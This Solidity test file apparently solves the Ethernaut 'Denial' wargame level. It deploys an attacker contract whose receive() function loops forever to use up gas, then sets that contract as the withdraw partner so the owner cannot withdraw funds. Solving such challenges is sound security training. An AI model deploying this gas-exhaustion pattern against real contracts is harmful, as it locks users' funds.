pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/20-Denial/Denial.sol";
import "../../src/ethernaut/20-Denial/DenialFactory.sol";

contract AttackDenial {
    uint256[] public a;

    //recive function
    receive() external payable {
        while (true) {
            a.push(1234);
        }
    }
}

contract DenialTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        DenialFactory factory = new DenialFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(factory);

        Denial denial = Denial(payable(levelAddress));

        console.log(denial.contractBalance());

        //attack contract
        AttackDenial attackDenial = new AttackDenial();

        //set partner
        denial.setWithdrawPartner(address(attackDenial));

        //withdraw
        // denial.withdraw();

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
